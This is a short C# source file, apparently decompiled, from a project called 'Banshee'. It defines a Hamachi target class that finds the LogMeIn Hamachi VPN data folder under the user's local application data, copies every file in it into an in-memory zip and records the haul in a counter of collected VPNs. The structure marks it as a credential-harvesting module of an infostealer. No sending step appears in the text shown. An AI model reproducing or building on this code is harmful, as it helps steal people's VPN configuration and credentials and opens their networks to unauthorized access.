﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x0200002B RID: 43
	public class Hamachi : ITarget
	{
		// Token: 0x06000059 RID: 89 RVA: 0x00003CBC File Offset: 0x00003CBC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LogMeIn Hamachi");
			if (Directory.Exists(text))
			{
				string text2 = ZipPath.Vpn("LogMeIn Hamachi");
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "LogMeIn Hamachi";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
